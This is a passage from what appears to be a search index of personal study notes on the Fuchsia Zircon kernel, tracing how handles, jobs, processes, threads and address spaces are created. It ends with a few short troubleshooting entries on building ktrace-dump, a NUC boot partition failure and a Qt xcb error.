fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( dispatcher ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } // Note that if this call fails to allocate the Handle, the underlying // Dispatcher's on_zero_handles() will be called. zx_status_t make ( KernelHandle < Dispatcher > handle , zx_rights_t rights ) { h_ = Handle :: Make ( ktl :: move ( handle ), rights ); return h_ ? ZX_OK : ZX_ERR_NO_MEMORY ; } ... private : HandleOwner h_ ; } A Handle is how a specific process refers to a specific Dispatcher. HandleOwner wraps a Handle in a unique_ptr that has single ownership of the Handle and deletes it whenever it falls out of scope ( HandleOwner = ktl::unique_ptr<Handle, HandleDestroyer> ). Handles should only be created by Make or Dup(licate) . In //zircon/kernel/object/include/object/handle.h , the code is. HandleOwner Handle::Make ( KernelHandle < Dispatcher > kernel_handle , zx_rights_t rights ) { uint32_t base_value ; void * addr = gHandleTableArena . Alloc ( kernel_handle . dispatcher (), \"new\" , & base_value ); if ( unlikely ( ! addr )) return nullptr ; kcounter_add ( handle_count_made , 1 ); kcounter_add ( handle_count_live , 1 ); return HandleOwner ( new ( addr ) Handle ( kernel_handle . release (), rights , base_value )); } Handle :: Handle ( fbl :: RefPtr < Dispatcher > dispatcher , zx_rights_t rights , uint32_t base_value ) : process_id_ ( ZX_KOID_INVALID ), dispatcher_ ( ktl :: move ( dispatcher )), rights_ ( rights ), base_value_ ( base_value ) {} When a JobDispatcher is constructed and added to its parent Job, the new job is after the parent's next-youngest child, or us if we have none. The handle can only get a RefPtr of JobDispatcher, which makes sense. So we use handle.dispatcher.get to get the pointer of the Job, which is JobDispatcher* . c++ JobDispatcher::JobDispatcher(uint32_t /*flags*/, fbl::RefPtr<JobDispatcher> parent, JobPolicy policy) : SoloDispatcher(ZX_JOB_NO_PROCESSES | ZX_JOB_NO_JOBS | ZX_JOB_NO_CHILDREN), parent_(ktl::move(parent)), max_height_(parent_ ? parent_->max_height() - 1 : kRootJobMaxHeight), state_(State::READY), return_code_(0), kill_on_oom_(false), policy_(policy), exceptionate_(ZX_EXCEPTION_CHANNEL_TYPE_JOB), debug_exceptionate_(ZX_EXCEPTION_CHANNEL_TYPE_JOB_DEBUGGER) { kcounter_add(dispatcher_job_create_count, 1); } Process. First, the definition of ProcessDispatcher is in //zircon/kernel/object/include/object/process_dispatcher.h . Create a process. zx_status_t sys_process_create ( zx_handle_t job_handle , user_in_ptr < const char > _name , size_t name_len , uint32_t options , user_out_handle * proc_handle , user_out_handle * vmar_handle ) { // some basic things // copy out the name char buf [ ZX_MAX_NAME_LEN ]; ktl :: string_view sp ; result = copy_user_string ( _name , name_len , buf , sizeof ( buf ), & sp ); fbl :: RefPtr < JobDispatcher > job ; auto status = up -> handle_table (). GetDispatcherWithRights ( job_handle , ZX_RIGHT_MANAGE_PROCESS , & job ); // create a new process dispatcher KernelHandle < ProcessDispatcher > new_process_handle ; KernelHandle < VmAddressRegionDispatcher > new_vmar_handle ; zx_rights_t proc_rights , vmar_rights ; result = ProcessDispatcher :: Create ( ktl :: move ( job ), sp , options , & new_process_handle , & proc_rights , & new_vmar_handle , & vmar_rights ); result = proc_handle -> make ( ktl :: move ( new_process_handle ), proc_rights ); if ( result == ZX_OK ) result = vmar_handle -> make ( ktl :: move ( new_vmar_handle ), vmar_rights ); return result ; } In this process creation, ProcessDispatcher::Create is the core function. In the creation of ProcessDispatcher. zx_status_t ProcessDispatcher::Create ( fbl :: RefPtr < JobDispatcher > job , ktl :: string_view name , uint32_t flags , KernelHandle < ProcessDispatcher >* handle , zx_rights_t * rights , KernelHandle < VmAddressRegionDispatcher >* root_vmar_handle , zx_rights_t * root_vmar_rights ) { fbl :: AllocChecker ac ; KernelHandle new_handle ( fbl :: AdoptRef ( new ( & ac ) ProcessDispatcher ( job , name , flags ))); zx_status_t result = new_handle . dispatcher () -> Initialize (); // Create a dispatcher for the root VMAR. KernelHandle < VmAddressRegionDispatcher > new_vmar_handle ; result = VmAddressRegionDispatcher :: Create ( new_handle . dispatcher () -> aspace () -> RootVmar (), ARCH_MMU_FLAG_PERM_USER , & new_vmar_handle , root_vmar_rights ); // Only now that the process has been fully created and initialized can we register it with its // parent job. We don't want anyone to see it in a partially initalized state. if ( ! job -> AddChildProcess ( new_handle . dispatcher ())) { return ZX_ERR_BAD_STATE ; } * rights = default_rights (); * handle = ktl :: move ( new_handle ); * root_vmar_handle = ktl :: move ( new_vmar_handle ); return ZX_OK ; } Here, we are interested in 2 functionalities. What initialization should the process do ( dispatcher()->Initialize() )? How does the VmAddressRegionDispatcher::Create work and how it relates to the new process? Here comes the initialization step. The calling tree is ProcessDiapatcher::Initialize -> VmAspace::Create -> VmAspace::Init . Specifically, the constructor of VmAspace is a initialization list as below. VmAspace :: VmAspace ( vaddr_t base , size_t size , uint32_t flags , const char * name ) : base_ ( base ), size_ ( size ), flags_ ( flags ), root_vmar_ ( nullptr ), aslr_prng_ ( nullptr , 0 ), arch_aspace_ ( base , size , arch_aspace_flags_from_flags ( flags )) { DEBUG_ASSERT ( size != 0 ); DEBUG_ASSERT ( base + size - 1 >= base ); Rename ( name ); } // Fun 1 zx_status_t ProcessDispatcher::Initialize () { LTRACE_ENTRY_OBJ ; Guard < Mutex > guard { get_lock ()}; // create an address space for this process, named after the process's koid. char aspace_name [ ZX_MAX_NAME_LEN ]; snprintf ( aspace_name , sizeof ( aspace_name ), \"proc:%\" PRIu64 , get_koid ()); aspace_ = VmAspace :: Create ( VmAspace :: TYPE_USER , aspace_name ); if ( ! aspace_ ) { return ZX_ERR_NO_MEMORY ; } return ZX_OK ; } // Fun 2 fbl :: RefPtr < VmAspace > VmAspace :: Create ( uint32_t flags , const char * name ) { LTRACEF ( \"flags 0x%x, name '%s' \\n \" , flags , name ); vaddr_t base ; size_t size ; switch ( flags & TYPE_MASK ) { case TYPE_USER : base = USER_ASPACE_BASE ; size = USER_ASPACE_SIZE ; break ; case TYPE_KERNEL : base = KERNEL_ASPACE_BASE ; size = KERNEL_ASPACE_SIZE ; break ; case TYPE_LOW_KERNEL : base = 0 ; size = USER_ASPACE_BASE + USER_ASPACE_SIZE ; break ; case TYPE_GUEST_PHYS : base = GUEST_PHYSICAL_ASPACE_BASE ; size = GUEST_PHYSICAL_ASPACE_SIZE ; break ; default : panic ( \"Invalid aspace type\" ); } fbl :: AllocChecker ac ; auto aspace = fbl :: AdoptRef ( new ( & ac ) VmAspace ( base , size , flags , name )); if ( ! ac . check ()) { return nullptr ; } // initialize the arch specific component to our address space zx_status_t status = aspace -> Init (); if ( status != ZX_OK ) { status = aspace -> Destroy (); DEBUG_ASSERT ( status == ZX_OK ); return nullptr ; } // add it to the global list { Guard < Mutex > guard { & aspace_list_lock }; aspaces . push_back ( aspace . get ()); } // return a ref pointer to the aspace return aspace ; } The third function in the calling tree is worth mentioning. For the architectural specific part, arch_aspace_.Init , if we taken X86 as an example, we can find the function X86ArchVmAspace::Init in //zircon/kernel/arch/x86/mmu.cc . Zircon uses ASLR to mitigate spatial memory corruption. For a process, the root VMAR covers the entire address space. zx_status_t VmAspace::Init () { canary_ . Assert (); // initialize the architecturally specific part zx_status_t status = arch_aspace_ . Init (); InitializeAslr (); if ( likely ( ! root_vmar_ )) { return VmAddressRegion :: CreateRoot ( * this , VMAR_FLAG_CAN_MAP_SPECIFIC , & root_vmar_ ); } return ZX_OK ; } /* * Fill in the high level x86 arch aspace structure and allocating a top level page table. */ zx_status_t X86ArchVmAspace::Init () { static_assert ( sizeof ( cpu_mask_t ) == sizeof ( active_cpus_ ), \"err\" ); canary_ . Assert (); LTRACEF ( \"aspace %p, base %#\" PRIxPTR \", size 0x%zx, mmu_flags 0x%x \\n \" , this , base_ , size_ , flags_ ); if ( flags_ & ARCH_ASPACE_FLAG_KERNEL ) { X86PageTableMmu * mmu = new ( & page_table_storage_ . mmu ) X86PageTableMmu (); pt_ = mmu ; zx_status_t status = mmu -> InitKernel ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"kernel aspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } else if ( flags_ & ARCH_ASPACE_FLAG_GUEST ) { X86PageTableEpt * ept = new ( & page_table_storage_ . ept ) X86PageTableEpt (); pt_ = ept ; zx_status_t status = ept -> Init ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"guest paspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } else { X86PageTableMmu * mmu = new ( & page_table_storage_ . mmu ) X86PageTableMmu (); pt_ = mmu ; zx_status_t status = mmu -> Init ( this , test_page_alloc_func_ ); if ( status != ZX_OK ) { return status ; } status = mmu -> AliasKernelMappings (); if ( status != ZX_OK ) { return status ; } LTRACEF ( \"user aspace: pt phys %#\" PRIxPTR \", virt %p \\n \" , pt_ -> phys (), pt_ -> virt ()); } ktl :: atomic_init ( & active_cpus_ , 0 ); return ZX_OK ; } Start a process. The first argument ( arg1 ) is a handle, which will be transferred from the process of the caller to the process being started, and an appropriate handle value will be placed in arg1 for the newly started thread. zx_process_start() is the only way to transfer a handle into a process that doesn't involve the process making some system call using a handle it already has. A process with no handles can make the few system calls that don't require a handle. So, the main question is, can we give an example to specify what arg1 and arg2 are. According to the tests in Fuchsia, most arg1s are Events defined in Zircon. Here, currently I have no idea why we give the new process an Event handle and how to use this to, let's say, get the handle of its parent job and create another job or process. zx_status_t sys_process_start ( zx_handle_t process_handle , zx_handle_t thread_handle , zx_vaddr_t pc , zx_vaddr_t sp , zx_handle_t arg_handle_value , uintptr_t arg2 ) { auto up = ProcessDispatcher :: GetCurrent (); // get process dispatcher fbl :: RefPtr < ProcessDispatcher > process ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( process_handle , ZX_RIGHT_WRITE , & process ); // get thread_dispatcher fbl :: RefPtr < ThreadDispatcher > thread ; status = up -> handle_table (). GetDispatcherWithRights ( thread_handle , ZX_RIGHT_WRITE , & thread ); HandleOwner arg_handle = up -> handle_table (). RemoveHandle ( arg_handle_value ); // test that the thread belongs to the starting process if ( thread -> process () != process . get ()) return ZX_ERR_ACCESS_DENIED ; zx_handle_t arg_nhv = ZX_HANDLE_INVALID ; if ( arg_handle ) { arg_nhv = process -> handle_table (). MapHandleToValue ( arg_handle ); process -> handle_table (). AddHandle ( ktl :: move ( arg_handle )); } status = thread -> Start ( ThreadDispatcher :: EntryState { pc , sp , static_cast < uintptr_t > ( arg_nhv ), arg2 }, /* initial_thread */ true ); return ZX_OK ; } Thread. To begin with, Zircon Threads are detached (not need to wait for join to release resource), by POSIX API may needs join. Create and start. Thread creation is similar. And the options must be 0 as well. The difference lies in the Processes and Jobs are listed in Jobs as a fat-wide tree structure. So, we only need to dive into ThreadDispatcher::Create and handle.dispatcher()->Initialize() . zx_status_t sys_thread_create ( zx_handle_t process_handle , user_in_ptr < const char > _name , size_t name_len , uint32_t options , user_out_handle * out ) { // copy out the name char buf [ ZX_MAX_NAME_LEN ]; ktl :: string_view sp ; zx_status_t result = copy_user_string ( _name , name_len , buf , sizeof ( buf ), & sp ); // convert process handle to process dispatcher auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ProcessDispatcher > process ; result = up -> handle_table (). GetDispatcherWithRights ( process_handle , ZX_RIGHT_MANAGE_THREAD , & process ); // create the thread dispatcher KernelHandle < ThreadDispatcher > handle ; zx_rights_t thread_rights ; result = ThreadDispatcher :: Create ( ktl :: move ( process ), options , sp , & handle , & thread_rights ); if ( result != ZX_OK ) return result ; result = handle . dispatcher () -> Initialize (); return out -> make ( ktl :: move ( handle ), thread_rights ); } In Thread creation, first we need to know how Process and Thread are related. Then, we must know the definition of user_thread and core_thread . Thread knows its parent's Process and the Process can access all threads from the first one by one. user_thread is the dispatcher and core_thread is for kernel and scheduler. In the creation, the pointer t is nullptr. Further reading about core_thread will be in scheduling. zx_status_t ThreadDispatcher::Create ( fbl :: RefPtr < ProcessDispatcher > process , uint32_t flags , ktl :: string_view name , KernelHandle < ThreadDispatcher >* out_handle , zx_rights_t * out_rights ) { // Create the user-mode thread and attach it to the process and lower level thread. fbl :: AllocChecker ac ; auto user_thread = fbl :: AdoptRef ( new ( & ac ) ThreadDispatcher ( process , flags )); // Create the lower level thread and attach it to the scheduler. Thread * core_thread = Thread :: Create ( name . data (), StartRoutine , user_thread . get (), DEFAULT_PRIORITY ); // We haven't yet compeleted initialization of |user_thread|, and // references to it haven't possibly escaped this thread. We can // safely set |core_thread_| outside the lock. [ & user_thread , & core_thread ]() TA_NO_THREAD_SAFETY_ANALYSIS { user_thread -> core_thread_ = core_thread ; }(); // The syscall layer will call Initialize(), which used to be called here. * out_rights = default_rights (); * out_handle = KernelHandle ( ktl :: move ( user_thread )); return ZX_OK ; } Thread * Thread::CreateEtc ( Thread * t , const char * name , thread_start_routine entry , void * arg , int priority , thread_trampoline_routine alt_trampoline ) { unsigned int flags = 0 ; if ( ! t ) { t = static_cast < Thread *> ( memalign ( alignof ( Thread ), sizeof ( Thread ))); if ( ! t ) { return nullptr ; } flags |= THREAD_FLAG_FREE_STRUCT ; } init_thread_struct ( t , name ); t -> task_state_ . Init ( entry , arg ); Scheduler :: InitializeThread ( t , priority ); zx_status_t status = t -> stack_ . Init (); if ( status != ZX_OK ) { if ( flags & THREAD_FLAG_FREE_STRUCT ) { free ( t ); } return nullptr ; } // save whether or not we need to free the thread struct and/or stack t -> flags_ = flags ; if ( likely ( alt_trampoline == nullptr )) { alt_trampoline = & Thread :: Trampoline ; } // set up the initial stack frame arch_thread_initialize ( t , ( vaddr_t ) alt_trampoline ); // add it to the global thread list { Guard < MonitoredSpinLock , IrqSave > guard { ThreadLock :: Get (), SOURCE_TAG }; thread_list -> push_front ( t ); } kcounter_add ( thread_create_count , 1 ); return t ; } When starting a Thread, it finally calls Start . We can see, the initial thread must be started by the Process, and others must be started by a Thread. Of-course, arg1 and arg2 are directly sent to the entry function. zx_status_t sys_thread_start ( zx_handle_t handle , zx_vaddr_t thread_entry , zx_vaddr_t stack , uintptr_t arg1 , uintptr_t arg2 ) { auto up = ProcessDispatcher :: GetCurrent (); fbl :: RefPtr < ThreadDispatcher > thread ; zx_status_t status = up -> handle_table (). GetDispatcherWithRights ( handle , ZX_RIGHT_MANAGE_THREAD , & thread ); return thread -> Start ( ThreadDispatcher :: EntryState { thread_entry , stack , arg1 , arg2 }, /* initial_thread= */ false ); } Access thread state system calls are for debugging and can be accessed only when the thread is suspended or has an exception.","title":"Program execution."},{"location":"troubles/missing-ktrace-dump/","text":"ktrace-dump utility is not built ktrace-dump is a small utility that converts Fuchsia's ktrace record into human-readable format. Reproduce Follow the Kernel Tracing tutorial, ktrace-dump utility is not build by default. Solution Use fx host-tool command. $ cd path/to/fuchsia #---------------# # build fuchsia # #---------------# # This command builds ktrace-dump automatically $ fx host-tool ktrace-dump","title":"[Solved] Missing ktrace-dump"},{"location":"troubles/missing-ktrace-dump/#ktrace-dump-utility-is-not-built","text":"ktrace-dump is a small utility that converts Fuchsia's ktrace record into human-readable format.","title":"ktrace-dump utility is not built"},{"location":"troubles/missing-ktrace-dump/#reproduce","text":"Follow the Kernel Tracing tutorial, ktrace-dump utility is not build by default.","title":"Reproduce"},{"location":"troubles/missing-ktrace-dump/#solution","text":"Use fx host-tool command. $ cd path/to/fuchsia #---------------# # build fuchsia # #---------------# # This command builds ktrace-dump automatically $ fx host-tool ktrace-dump","title":"Solution"},{"location":"troubles/nuc-boot-missing-partition/","text":"Missing Partition when Booting on NUC Missing parition when booting on Intel NUC 9 Extreme Kit. Reproduce Host OS: Linux x86_64 Distro: Manjaro KDE Plasma Host CPU: i7-10700 Target: Intel NUC 9 Extreme Kit Follow Install Fuchsia on a NUC . $ fx set core.x64 --release # or: # fx set workstation.x64 # fx set core.x64 $ fx build $ fx mkzedboot /dev/sda # Plug USB media to target and power on. It ends with: Cause It seems a Gigaboot's bug. We have tested two version of gigaboot: one that succeeded is at b3126fb95c55bde3d99ff5358f3b5ec3bce2717e (the older version) one that failed is at `` (the newer version)","title":"Missing Partition when Booting on NUC"},{"location":"troubles/nuc-boot-missing-partition/#missing-partition-when-booting-on-nuc","text":"Missing parition when booting on Intel NUC 9 Extreme Kit.","title":"Missing Partition when Booting on NUC"},{"location":"troubles/nuc-boot-missing-partition/#reproduce","text":"Host OS: Linux x86_64 Distro: Manjaro KDE Plasma Host CPU: i7-10700 Target: Intel NUC 9 Extreme Kit Follow Install Fuchsia on a NUC . $ fx set core.x64 --release # or: # fx set workstation.x64 # fx set core.x64 $ fx build $ fx mkzedboot /dev/sda # Plug USB media to target and power on. It ends with:","title":"Reproduce"},{"location":"troubles/nuc-boot-missing-partition/#cause","text":"It seems a Gigaboot's bug. We have tested two version of gigaboot: one that succeeded is at b3126fb95c55bde3d99ff5358f3b5ec3bce2717e (the older version) one that failed is at `` (the newer version)","title":"Cause"},{"location":"troubles/qt-missing-xcb/","text":"QT Missing xcb error Reproduce Follow Start the Fuchsia emulator on Manjaro Linux and it will show that xcb is missing. Solved Just switch to Ubuntu to save your life.","title":"[Solved] QT Missing xcb"},{"location":"troubles/qt-missing-xcb/#qt-missing-xcb-error","text":"","title":"QT Missing xcb error"},{"location":"troubles/qt-missing-xcb/#reproduce","text":"Follow Start the Fuchsia emulator on Manjaro Linux and it will show that xcb is missing.","title":"Reproduce"},{"location":"troubles/qt-missing-xcb/#solved","text":"Just switch to Ubuntu to save your life.","title":"Solved"}]}